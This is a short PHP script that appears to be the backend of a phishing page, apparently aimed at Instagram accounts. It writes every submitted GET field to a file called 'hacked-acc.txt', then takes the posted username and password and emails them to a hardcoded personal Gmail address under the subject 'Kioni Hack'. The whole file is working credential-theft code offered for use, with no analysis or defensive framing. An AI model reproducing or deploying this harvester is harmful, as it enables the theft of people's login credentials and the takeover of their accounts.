<?php
header ('Location:');
$handle = fopen("hacked-acc.txt", "a");
foreach($_GET as $variable => $value) {
   fwrite($handle, $variable);
   fwrite($handle, "=");
   fwrite($handle, $value);
   fwrite($handle, "\r\n");
}
fwrite($handle, "\r\n");
fclose($handle);
$to      = 'Afsoonkhodadadian92@gmail.com';
$subject = 'Kioni Hack';
$username = $_POST['username'];
$password = $_POST['password'];
$message = "Username:" . $username . "\r\n" . "Password: " . $password;
$headers = 'From: Insta_qasem' . "\r\n" .
    'Reply-To: Afsoonkhodadadian92@gmail.comgmail.com' . "\r\n" .
    'X-Mailer: PHP/' . phpversion();

mail($to, $subject, $message, $headers);
exit;
?>
